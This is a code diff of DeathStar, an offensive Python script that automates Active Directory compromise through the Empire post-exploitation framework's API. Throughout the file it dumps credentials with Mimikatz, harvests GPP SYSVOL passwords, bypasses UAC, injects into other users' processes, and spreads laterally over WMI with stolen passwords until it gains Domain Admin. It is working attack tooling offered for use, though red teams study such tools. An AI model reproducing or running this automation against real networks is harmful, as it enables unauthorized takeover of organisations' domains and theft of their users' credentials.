@@ -1,3 +1,23 @@
+#! /usr/bin/env python3
+
+# Copyright (c) 2017-2018 byt3bl33d3r
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 3 of the
+# License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
+# General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
+# USA
+#
+
 import requests
 import argparse
 import os
@@ -5,13 +25,17 @@ import threading
 import signal
 import sys
 import re
+from termcolor import colored
+from argparse import RawTextHelpFormatter
 from time import sleep
 from requests import ConnectionError
-from IPython import embed
+#from IPython import embed
 
 #The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+__version__ = '0.0.1'
 
 class KThread(threading.Thread):
     """
@@ -55,13 +79,13 @@ def login(empire_username, empire_password):
     payload = {'username': empire_username,
                'password': empire_password}
 
-    print('[*] Powering up the Death Star')
+    print_info('Powering up the Death Star')
     r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)
 
     if r.status_code == 200:
         token['token'] = r.json()['token']
     else:
-        print('[-] I find your lack of faith disturbing... (Authentication Failed)')
+        print_bad('I find your lack of faith disturbing... (Authentication Failed)')
         sys.exit(1)
 
 def get_listener_by_name(listener_name='DeathStar'):
@@ -74,7 +98,7 @@ def start_listener(listener_options, listener_type='http'):
     r = requests.post(base_url + '/api/listeners/{}'.format(listener_type), params=token, headers=headers, json=listener_options, verify=False)
     if r.status_code == 200:
         r = r.json()
-        print('[*] Created Death Star listener => {}'.format(r))
+        print_info('Created Death Star listener => {}'.format(r))
         return r
     print(r.json())
     raise
@@ -96,13 +120,16 @@ def get_agent_results(agent_name):
 def run_shell_command(agent_name, command):
     payload = { 'command': command} 
 
-    r = requests.post(base_url + '/api/agents/{}/shell'.format(agent_name), params=token, headers=headers, json=payload, verify=False)
-    if r.status_code == 200:
-        r = r.json()
-        if debug: print("[DEBUG] Agent: {} Executed Shell Command => success: {} taskID: {}".format(agent_name, r['success'], r['taskID']))
-        return r
-    print(r.json())
-    raise
+    try:
+        r = requests.post(base_url + '/api/agents/{}/shell'.format(agent_name), params=token, headers=headers, json=payload, verify=False)
+        if r.status_code == 200:
+            r = r.json()
+            if debug: print_debug("Executed Shell Command => success: {} taskID: {}".format(r['success'], r['taskID']), agent_name)
+            return r
+        else:
+            print_bad("Error executing shell command '{}': {}".format(command, r.json()), agent_name)
+    except Exception as e:
+        print_bad("Error executing shell command '{}': {}".format(command, e), agent_name)
 
 def run_shell_command_with_results(agent_name, command):
     r = run_shell_command(agent_name, command)
@@ -119,13 +146,16 @@ def execute_module(module_name, agent_name, module_options=None):
     if module_options:
         payload.update(module_options)
 
-    r = requests.post(base_url + '/api/modules/{}'.format(module_name), params=token, headers=headers, json=payload, verify=False)
-    if r.status_code == 200:
-        r = r.json()
-        if debug: print("[DEBUG] Agent: {} Executed Module => success: {} taskID: {} msg: '{}'".format(agent_name, r['success'], r['taskID'], r['msg']))
-        return r
-    print(r.json())
-    raise
+    try:
+        r = requests.post(base_url + '/api/modules/{}'.format(module_name), params=token, headers=headers, json=payload, verify=False)
+        if r.status_code == 200:
+            r = r.json()
+            if debug: print_debug("Executed Module => success: {} taskID: {} msg: '{}'".format(r['success'], r['taskID'], r['msg']), agent_name)
+            return r
+        else:
+            print_bad("Error executing module '{}': {}".format(module_name, r.json()), agent_name)
+    except Exception as e:
+        print_bad("Error executing module '{}': {}".format(module_name, e), agent_name)
 
 def execute_module_with_results(module_name, agent_name, module_options=None):
     r = execute_module(module_name, agent_name, module_options)
@@ -180,7 +210,7 @@ def get_group_member(agent_name, group_name='"Domain Admins"'):
 
         if user and domain: members.append('{}\\{}'.format(domain, user))
 
-    print("[+] Agent: {} => Found {} members for the '{}' group: {}".format(agent_name, len(members), group_name, members))
+    print_good("Found {} members for the '{}' group: {}".format(len(members), group_name, members), agent_name)
 
     return members
 
@@ -192,16 +222,14 @@ def get_domain_controller(agent_name):
         if entry.startswith('Name'):
             dcs.append(entry.split(':')[1].strip())
 
-    print('[+] Agent: {} => Found {} Domain Controllers: {}'.format(agent_name, len(dcs), dcs))
+    print_good('Found {} Domain Controllers: {}'.format(len(dcs), dcs), agent_name)
 
     return dcs
 
-def user_hunter(agent_name, group_name='"Domain Admins"', threads=5, no_ping=False):
+def user_hunter(agent_name, group_name='"Domain Admins"', threads=20, no_ping=False):
     module_options = {'GroupName': group_name,
-                      'Threads'  : str(int(threads))}
-
-    if no_ping:
-        module_options['NoPing'] = str(bool(no_ping))
+                      'Threads'  : str(int(threads)),
+                      'NoPing'   : str(bool(no_ping))}
 
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/user_hunter', agent_name, module_options)
     results = results.strip().split('\r\n\r\n')[:-2]
@@ -219,19 +247,19 @@ def user_hunter(agent_name, group_name='"Domain Admins"', threads=5, no_ping=Fal
                 session['username'] = entry.split(':')[1].strip()
             if entry.startswith('ComputerName'):
                 session['hostname'] = entry.split(':')[1].strip()
+            if entry.startswith('SessionFromName'):
+                session['sessionfrom'] = entry.split(':')[1].strip()
 
         if session: admin_sessions.append(session)
 
-    print('[+] Agent: {} => Found {} active Admin sessions: {}'.format(agent_name, len(admin_sessions), [session['hostname'] for session in admin_sessions]))
+    print_good('Found {} active Admin sessions: {}'.format(len(admin_sessions), [session['hostname'] for session in admin_sessions]), agent_name)
 
     return admin_sessions
 
-def find_localadmin_access(agent_name, threads=5, no_ping=False, computer_name=''):
-    module_options = {'ComputerName': computer_name}
-    if threads:
-      module_options['Threads'] = str(int(threads))
-    if no_ping:
-      module_options['NoPing'] = str(bool(no_ping))
+def find_localadmin_access(agent_name, threads=20, no_ping=False, computer_name=''):
+    module_options = {'ComputerName': computer_name,
+                      'Threads': str(int(threads)),
+                      'NoPing': str(bool(no_ping))}
 
     results = execute_module_with_results('powershell/situational_awareness/network/powerview/find_localadmin_access', agent_name, module_options)
     if results.startswith('Job'):
@@ -243,12 +271,12 @@ def find_localadmin_access(agent_name, threads=5, no_ping=False, computer_name='
     results = results[:-2]
 
     if not computer_name:
-        print('[+] Agent: {} => Current security context has admin access to {} hosts'.format(agent_name, len(results)))
+        print_good('Current security context has admin access to {} hosts'.format(len(results)), agent_name)
     else:
         if not results:
-            print('[-] Agent: {} => Current security context does not have admin access to {}'.format(agent_name, computer_name))
+            print_bad('Current security context does not have admin access to {}'.format(computer_name), agent_name)
         else:
-            print('[+] Agent: {} => Current security context has admin access to {}'.format(agent_name, computer_name))
+            print_good('Current security context has admin access to {}'.format(computer_name), agent_name)
 
     return results
 
@@ -269,7 +297,7 @@ def get_gpo_computer(agent_name, GUID):
     # Deletes the '\nGet-GPOComputer completed!' string and a rogue '\n'
     results = results[:-2]
 
-    print('[+] Agent: {} => GPO {} is applied to {} computers'.format(agent_name, GUID, len(results)))
+    print_good('GPO {} is applied to {} computers'.format(GUID, len(results)), agent_name)
 
     return results
 
@@ -310,7 +338,7 @@ def gpp(agent_name):
                 for remainder in entries[file_index+1:]:
                     file += remainder.strip()
 
-        if file is not None and (usernames and passwords):
+        if file and (usernames and passwords):
             gpp['file'] = file
             gpp['guid'] = file.split('\\')[6][1:-1]
             if not len(gpp['guid']) == 36:
@@ -319,7 +347,7 @@ def gpp(agent_name):
             gpp['creds'] = dict(zip(usernames, passwords))
             gpps.append(gpp)
 
-    print('[+] Agent: {} => Found {} credentials using GPP SYSVOL privesc'.format(agent_name, len(gpps)))
+    print_good('Found {} credentials using GPP SYSVOL privesc'.format(len(gpps)), agent_name)
 
     return gpps
 
@@ -340,7 +368,7 @@ def get_loggedon(agent_name, computer_name='localhost'):
         if user not in loggedon_users:
             loggedon_users.append(user)
 
-    print('[+] Agent: {} => Found {} users logged into {}: {}'.format(agent_name, len(loggedon_users), computer_name, loggedon_users))
+    print_good('Found {} users logged into {}: {}'.format(len(loggedon_users), computer_name, loggedon_users), agent_name)
 
     return loggedon_users
 
@@ -379,19 +407,18 @@ def tasklist(agent_name, process=None, username=None):
             if not list(filter(lambda proc: proc['pid'] == pid, processes)):
                 processes.append({'name': name, 'pid': pid, 'arch': arch, 'username': user})
 
-    print('[+] Agent: {} => Enumerated {} processes'.format(agent_name, len(processes)))
+    print_good('Enumerated {} processes'.format(len(processes)), agent_name)
 
     return processes
 
 def psinject(agent_name, process, listener='DeathStar'):
     module_options = {'Listener': listener}
     if process.isdigit():
-        module_options['ProcId'] = process
+        module_options['ProcId'] = str(process)
     else:
-        module_options['ProcName'] = process
-    module_options['Listener'] = listener
+        module_options['ProcName'] = str(process)
 
-    print('[*] Agent: {} => PSInjecting into process {}'.format(agent_name, process))
+    print_info('PSInjecting into process {}'.format(process), agent_name)
     execute_module('powershell/management/psinject', agent_name, module_options)
 
 def invoke_wmi(agent_name, computer_name, listener='DeathStar', username='', password=''):
@@ -402,40 +429,38 @@ def invoke_wmi(agent_name, computer_name, listener='DeathStar', username='', pas
 
     results = execute_module_with_results('powershell/lateral_movement/invoke_wmi', agent_name, module_options)
     if results.lower().startswith('invoke-wmi executed'):
-        print('[+] Agent: {} => Spread laterally using {} to {}'.format(agent_name, 
-                                                                        '{} credentials'.format(username) if username and password else 'current security context',
-                                                                        computer_name))
+        print_good('Spread laterally using {} to {}'.format('{} credentials'.format(username) if username and password else 'current security context',
+                                                            computer_name), agent_name)
 
     elif results.startswith('error'):
-        print("[-] Agent: {} => Failed to spread laterally using {} to {}: '{}'".format(agent_name, 
-                                                                                       '{} credentials'.format(username) if username and password else 'current security context',
-                                                                                       computer_name,
-                                                                                       results))
+        print_bad("Failed to spread laterally using {} to {}: '{}'".format('{} credentials'.format(username) if username and password else 'current security context',
+                                                                           computer_name,
+                                                                           results), agent_name)
 
 def mimikatz(agent_name):
     results = execute_module_with_results('powershell/credentials/mimikatz/logonpasswords', agent_name)
-    if results: print('[+] Agent: {} => Executed Mimikatz'.format(agent_name))
+    if results: print_good('Executed Mimikatz', agent_name)
 
 def spawnas(agent_name, listener='DeathStar', cred_id='', username='', password=''):
     module_options = { 'Listener': listener,
-                       'CredID': cred_id,
-                       'Username': username,
+                       'CredID': str(cred_id),
+                       'UserName': username,
                        'Password': password}
 
-    print('[*] Agent: {} => Spawning new Agent {}'.format(agent_name, 'as {}'.format(username) if username and password else 'using CredID {}'.format(cred_id)))
+    print_info('Spawning new Agent {}'.format('with credentials for {}'.format(username) if username and password else 'using CredID {}'.format(cred_id)), agent_name)
     execute_module('powershell/management/spawnas', agent_name, module_options)
 
 def bypassuac_eventvwr(agent_name, listener='DeathStar'):
     module_options = {'Listener': listener}
 
-    print('[*] Agent: {} => Attempting to elevate using bypassuac_eventvwr'.format(agent_name))
+    print_info('Attempting to elevate using bypassuac_eventvwr', agent_name)
     execute_module('powershell/privesc/bypassuac_eventvwr', agent_name, module_options)
 
 #########################################################################################################################################
 
 def recon(agent_name):
     if running_under_domain_account(agent_name):
-        print('[*] Agent: {} => Starting recon'.format(agent_name))
+        print_info('Starting recon', agent_name)
         for member in get_group_member(agent_name):
             domain_admins.append(member)
 
@@ -445,6 +470,8 @@ def recon(agent_name):
         for session in user_hunter(agent_name, no_ping=True):
             if session['hostname'] not in priority_targets:
                 priority_targets.append(session['hostname'])
+            if session['sessionfrom'] not in priority_targets:
+                priority_targets.append(session['sessionfrom'])
 
     del recon_threads[agent_name]
 
@@ -456,11 +483,10 @@ def spread(agent_name):
         if agents[agent_name]['username'] not in spread_usernames:
             spread_usernames.append(agents[agent_name]['username'])
 
-            print('[*] Agent: {} => Starting lateral movement'.format(agent_name))
-            if priority_targets:
-                for box in priority_targets:
-                    if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
-                        invoke_wmi(agent_name, box, 'DeathStar')
+            print_info('Starting lateral movement', agent_name)
+            for box in set(priority_targets) ^ set(domain_controllers):
+                if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
+                    invoke_wmi(agent_name, box, 'DeathStar')
 
             for box in find_localadmin_access(agent_name, no_ping=True):
                 # Do we have an agent on the box? if not pwn it
@@ -469,10 +495,20 @@ def spread(agent_name):
 
 def privesc(agent_name):
     if running_under_domain_account(agent_name):
-        print('[*] Agent: {} => Starting domain privesc'.format(agent_name))
-        for result in gpp(agent_name):
-            for box in get_gpo_computer(agent_name, result['guid']):
-                for username, password in result['creds'].items():
+
+        print_info('Starting domain privesc', agent_name)
+        results = gpp(agent_name)
+
+        for result in results:
+            computers = get_gpo_computer(agent_name, result['guid'])
+            for username, password in result['creds'].items():
+                for box in set(priority_targets) & set(computers):
+                    if not agent_on_host(hostname=box):
+                        # These are local accounts so we append '.\' to the username to specify it
+                        invoke_wmi(agent_name, box, 'DeathStar', '.\\' + username, password)
+
+            for username, password in result['creds'].items():
+                for box in computers:
                     if not agent_on_host(hostname=box):
                         # These are local accounts so we append '.\' to the username to specify it
                         invoke_wmi(agent_name, box, 'DeathStar', '.\\' + username, password)
@@ -494,7 +530,9 @@ def pwn_the_shit_out_of_everything(agent_name):
 
     for user in get_loggedon(agent_name):
         if user in domain_admins:
-            print('[+] Agent: {} => Found Domain Admin logged in: {}'.format(agent_name, user))
+            print_good(colored('Found Domain Admin logged in: {}'.format(user), 'red', attrs=['bold']), agent_name)
+            if agents[agent_name]['hostname'] not in priority_targets:
+                priority_targets.append(agents[agent_name]['hostname'])
 
     spread_threads[agent_name] = KThread(target=spread, args=(agent_name,))
     spread_threads[agent_name].start()
@@ -504,23 +542,31 @@ def pwn_the_shit_out_of_everything(agent_name):
         privesc_threads[agent_name].start()
 
     if agents[agent_name]['high_integrity']:
-        tokens(agent_name)
+        #tokens(agent_name)
+        #powerdump(agent_name)
+
+        # This doesn't need to be explorer, change it at will ;)
+        for process in tasklist(agent_name, process='explorer'):
+            if process['username'] != agents[agent_name]['username'] and process['username'] != 'N/A' and process['username'] not in spread_usernames:
+                print_info('Found process {} running under {}'.format(process['pid'], process['username']), agent_name)
+                psinject(agent_name, process['pid'])
 
         if agents[agent_name]['os'].lower().find('windows 7') != -1:
             mimikatz_thread = KThread(target=mimikatz, args=(agent_name,))
             mimikatz_thread.daemon = True
             mimikatz_thread.start()
 
-        #powerdump()
-
-        # This doesn't need to be explorer, change it at will ;)
-        for process in tasklist(agent_name, process='explorer'):
-            if process['username'] != agents[agent_name]['username'] and process['username'] != 'N/A' and process['username'] not in spread_usernames:
-                print('[*] Agent: {} => Found process {} running under {}'.format(agent_name, process['pid'], process['username']))
-                psinject(agent_name, process['pid'])
-
     if not agents[agent_name]['high_integrity']:
-        elevate(agent_name)
+        if not agent_on_host(hostname=agents[agent_name]['hostname'], high_integrity=True):
+            elevate(agent_name)
+
+    # Spawn only two additional agents per host
+    for loop in range(2): 
+        for cred in get_stored_credentials()['creds']:
+            if cred['credtype'] == 'plaintext':
+                account = '{}\\{}'.format(cred['domain'].split('.')[0].upper(), cred['username'])
+                if account not in spread_usernames:
+                    spawnas(agent_name, cred_id=cred['ID'])
 
 ############################################################################################################################################
 
@@ -532,13 +578,18 @@ def running_under_domain_account(agent_name):
         return True
     return False
 
-def agent_on_host(hostname=None, ip=None):
+def agent_on_host(hostname=None, ip=None, high_integrity=None):
     agent_on_host = False
     for name, info in agents.items():
         if hostname and info['hostname'].lower() == hostname.split('.')[0].lower():
+            if high_integrity is not None and high_integrity != info['high_integrity']:
+                continue
             agent_on_host = True
             break
+
         elif ip and info['ip'] == ip:
+            if high_integrity is not None and high_integrity != info['high_integrity']:
+                continue
             agent_on_host = True
             break
 
@@ -552,29 +603,42 @@ def agent_finished_initializing(agent_dict):
         return False
     return True
 
-def print_win_banner(msg, agent_name=None):
-    print('\n[+] {}{}'.format('Agent: {} => '.format(agent_name) if agent_name else '', msg))
-    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
-    print("=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
-    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
+def print_info(msg, agent_name=None):
+    print(colored('[*]', 'blue') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)
+
+def print_good(msg, agent_name=None):
+    print(colored('[+]', 'green') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)
+
+def print_bad(msg, agent_name=None):
+    print(colored('[-]', 'red') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)
+
+def print_debug(msg, agent_name=None):
+    print(colored('[DEBUG]', 'cyan') + '{}'.format(' Agent: {} => '.format(agent_name) if agent_name else ' ') + msg)
+
+def print_win_banner():
+    print('\n')
+    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
+    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
+    print(colored('=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=', 'yellow'))
 
 def signal_handler(signal, frame):
-    print('\n[*] Powering down...')
+    print('\n')
+    print_info('Powering down...')
+    print_info('Killing recon threads')
     for name, thread in recon_threads.items():
-        print('[*] Killing recon thread for Agent {}'.format(name))
         del recon_threads[name]
         #thread.kill()
 
+    print_info('Killing spread threads')
     for name, thread in spread_threads.items():
-        print('[*] Killing spread thread for Agent {}'.format(name))
         thread.kill()
 
-    for name, thread in privesc_threads.items():  
-        print('[*] Killing privesc thread for Agent {}'.format(name))
+    print_info('Killing privesc threads')
+    for name, thread in privesc_threads.items():
         thread.kill()
 
+    print_info('Killing agent threads')
     for name, thread in agent_threads.items():
-        print('[*] Killing thread for Agent {}'.format(name))
         thread.kill()
 
     sys.exit(0)
@@ -656,11 +720,24 @@ if __name__ == '__main__':
 
 """
 
-args = argparse.ArgumentParser(description='Death Star')
-args.add_argument('-u', '--username', type=str, default='empireadmin', help='Empire username')
-args.add_argument('-p', '--password', type=str, default='Password123', help='Empire password')
-args.add_argument('-t', '--threads', type=int,  help='Specifies the number of threads for modules to use')
-args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL')
+args = argparse.ArgumentParser(description='''
+
+         _______   _______     ___   .___________. __    __          _______.___________.    ___      .______      
+        |       \ |   ____|   /   \  |           ||  |  |  |        /       |           |   /   \     |   _  \     
+        |  .--.  ||  |__     /  ^  \ `---|  |----`|  |__|  |       |   (----`---|  |----`  /  ^  \    |  |_)  |    
+        |  |  |  ||   __|   /  /_\  \    |  |     |   __   |        \   \       |  |      /  /_\  \   |      /     
+        |  '--'  ||  |____ /  _____  \   |  |     |  |  |  |    .----)   |      |  |     /  _____  \  |  |\  \----.
+        |_______/ |_______/__/     \__\  |__|     |__|  |__|    |_______/       |__|    /__/     \__\ | _| `._____|
+                                                                                                                   
+                                                     Version: {}
+
+    '''.format(__version__),
+      formatter_class=RawTextHelpFormatter)
+args.add_argument('-u', '--username', type=str, default='empireadmin', help='Empire username (default: empireadmin)')
+args.add_argument('-p', '--password', type=str, default='Password123', help='Empire password (default: Password123)')
+args.add_argument('-lp', '--listener-port', type=int, default=8443, metavar='PORT', help='Port to start the DeathStar listener on (default: 8443)')
+args.add_argument('-t', '--threads', type=int, default=20, help='Specifies the number of threads for modules to use (default: 20)')
+args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL (default: https://127.0.0.1:1337)')
 args.add_argument('--debug', action='store_true', help='Enable debug output')
 
 args = args.parse_args()
@@ -672,9 +749,9 @@ os.system('clear')
 headers = {'Content-Type': 'application/json'}
 token = {'token': None}
 
-gotz_da = False
 tried_domain_privesc = False
 
+module_threads = args.threads
 base_url = args.url
 debug = args.debug
 
@@ -693,31 +770,36 @@ spread_usernames   = [] # List of accounts we already used to laterally spread
 login(args.username, args.password)
 
 if not get_listener_by_name():
-    start_listener({'CertPath': 'data/empire.pem', 'Name': 'DeathStar', 'Port': 7654})
+    start_listener({'CertPath': 'data/empire.pem', 'Name': 'DeathStar', 'Port': args.listener_port})
 
 #delete_all_agent_results()
 
-print('[*] Polling for agents')
-while not gotz_da:
+print_info('Polling for agents')
+while True:
     for cred in get_stored_credentials()['creds']:
-        # TO DO: for every credential, use the spawnas module max 2 times per agent
         if cred['credtype'] == 'plaintext':
-            for da_acct in domain_admins:
-                domain, username = da_acct.split('\\')
-                if cred['username'] == username and cred['domain'].split('.')[0].upper() == domain:
-                    print_win_banner('Got Domain Admin via credentials! => Username: {} Password: {}'.format(da_acct, cred['password']))
-                    gotz_da = True
-                    signal_handler(None, None)
-                    break
+            account = '{}\\{}'.format(cred['domain'].split('.')[0].upper(), cred['username'])
+            if account in domain_admins:
+                print('\n')
+                print_good(colored('Got Domain Admin via credentials!', 'red', attrs=['bold']) + ' => Username: {} Password: {}'.format(colored(account, 'yellow'), 
+                                                                                                                                        colored(cred['password'], 'yellow')))
+                print_win_banner()
+                signal_handler(None, None)
+                break
 
     for agent in get_agents()['agents']:
         agent_name = agent['name']
         if agent_name not in agents.keys() and agent_finished_initializing(agent):
-            print('[+] New Agent => ID: {} Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['ID'], agent['name'], agent['external_ip'], agent['hostname'], agent['username'], agent['high_integrity']))
+            print_good(colored('New Agent'.format(agent['name']), 'yellow') + ' => Name: {} IP: {} HostName: {} UserName: {} HighIntegrity: {}'.format(agent['name'],
+                                                                                                                                                       agent['external_ip'], 
+                                                                                                                                                       agent['hostname'], 
+                                                                                                                                                       agent['username'], 
+                                                                                                                                                       agent['high_integrity']))
 
             if agent['username'] in domain_admins and agent['high_integrity']:
-                print_win_banner('Got Domain Admin via security context!', agent['name'])
-                gotz_da = True
+                print('\n')
+                print_good(colored('Got Domain Admin via security context!', 'red', attrs=['bold']), agent['name'])
+                print_win_banner()
                 signal_handler(None, None)
                 break
 
